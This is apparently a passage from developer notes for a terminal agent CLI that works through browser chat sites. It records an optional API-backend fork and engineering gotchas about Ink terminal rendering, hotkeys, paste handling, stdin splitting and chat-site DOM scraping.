**C. An optional API backend.** The only option that actually removes the ceiling: structured
calls, real parallelism, caching, and `looksLikeCapabilityDenial` plus half of `PromptBuilder`'s
economics become dead code. It contradicts the standing "no API keys" decision above, so it is
recorded as a fork, not a plan. The framing that preserves the thesis: the browser bridge stays
the default and the identity of the project; an API backend is opt-in for people who already
have a key.

## Gotchas

- **`server/src/index.js` is the bin and does nothing but re-spawn `main.js` under `tsx`** —
  the sources contain JSX, so plain `node src/main.js` fails.
- `App.jsx` is performance-sensitive: it avoids re-rendering during streaming to prevent
  terminal tearing, and uses raw ANSI (`\x1b[1m`) in places because `marked-terminal` mangles
  inline markdown inside list items. It was split into `ui/` modules by moving blocks verbatim
  behind explicit dependency lists; the `<Static>` element, `staticEpoch` and the streaming
  path stayed in `App.jsx` deliberately, and adding memoization to the transcript rows is how
  the scroll glitches came back the last two times.
- **The live frame must never outgrow the viewport.** This is the single most important rule in
  `ui/`. When Ink's dynamic output is taller than the terminal, `shouldClearTerminalForFrame`
  (`ink/build/ink.js`) switches it to writing `ESC[2J ESC[3J` plus a full repaint on *every*
  render. Measured on the pre-fix code, sitting idle with a 12-turn history in a 24-row
  terminal: 108 full clears and 108 scrollback wipes in 15 seconds, 3.85 MB of escape codes.
  That is what "it flickers and I can't scroll or copy" was — the terminal's scrollback and the
  user's selection were being deleted seven times a second. The same shape is now 36 KB and
  zero clears. So: settled turns go to `<Static>`, only the in-flight turn is live, and every
  live row is bounded by `liveBudget` (`terminalHeight - RESERVED_ROWS`). Adding an unbounded
  row to the live region — a full tool result, an artifact dump, a list that grows — brings the
  whole thing back.
- **No mouse tracking, ever.** Terminal mouse reporting and native scroll are mutually
  exclusive: a terminal that is tracking hands the app the wheel and suppresses drag-select. The
  app therefore enables nothing, and `cli-ui.jsx` writes the disable sequences once on startup
  in case a crashed run left the terminal tracking. Scroll, drag-select and copy are the
  terminal's, exactly as in Claude Code. Everything that used to be clickable is a keybinding.
- **The transcript has no selection model.** `Ctrl+E` toggles verbosity for the *whole*
  transcript rather than one row, because there is nothing to point at a single row with. Ink
  cannot repaint what `<Static>` has committed, so `toggleVerbose` clears the screen and lets
  Static print the transcript again at the new setting — that one clear per keypress is
  deliberate and is the only `ESC[2J` the app writes. ↑/↓ always mean input history.
- **`ink-text-input` types every key it does not recognise.** Its handler special-cases exactly
  one chord, ctrl+c, so a ctrl+e handled in `useKeyBindings` still left a stray `e` in the
  prompt — and ctrl+o, ctrl+t and ctrl+v their letters. Ink offers no way to stop a `useInput`
  handler running, and the text field's is registered first (child effects run before the
  parent's). So the chords never reach Ink at all: `cli-ui.jsx` pulls them out of the stdin
  chunk via `hotkeys.js` and dispatches them through `use-hotkeys.js`. Adding a new ctrl+ binding
  means adding it to `HOTKEYS`, not to `useKeyBindings`.
- **A paste is folded to a marker, not typed into the prompt.** `usePaste` (Ink 7) turns on
  bracketed paste, which is the only thing that distinguishes "pasted forty lines" from "typed
  forty lines very fast" — and it keeps the text off `useInput` entirely. `paste.js` swaps
  anything over four lines for `[Pasted text #1 +42 lines]` and `App.handleSubmit` expands it on
  the way to the model. This is a frame-budget rule as much as a legibility one: the input box
  is in the live frame, and a pasted file is the easiest way to blow the viewport.
- **Ink never reads the real stdin.** `cli-ui.jsx` pipes `process.stdin` through a PassThrough
  so `enter-splitter.js` can peel a trailing `\r` into a chunk of its own. Ink's input parser
  deliberately does not split `\r` from adjacent text (a CR can sit inside a paste), so when the
  terminal delivers the last typed character and the Enter after it in one read — routine when
  typing fast, over ssh, in tmux, or on key repeat — Ink sees `"i\r"` with `key.return` false,
  `ink-text-input` types the CR into the prompt, and **the message is silently never sent**. The
  second write is deferred with `setImmediate`, because Ink's `read()` drains everything
  buffered and two back-to-back writes would arrive as the one chunk this exists to split.
- Running the CLI without a TTY fails with Ink's "Raw mode is not supported". That is the
  harness, not a bug — use `script -q /dev/null <cmd>` to test under a pty.
- Content-script DOM selectors break when the chat sites change; `extractLatestResponse` must
  wait for a *new* block before scraping. Gemini's editor only ingests text via a synthetic
  `ClipboardEvent('paste')` — setting `innerHTML` breaks it (`LEARNINGS.md`).
- `AGENT.md` at the repo root is *workspace* context read by `prompt-builder.js`, not
  instructions for you. It belongs to whatever project the agent is pointed at.
- The agent defaults to `--workspace ../`, so running it here makes it operate on its own repo.
  That is why this repo kept accumulating agent state.
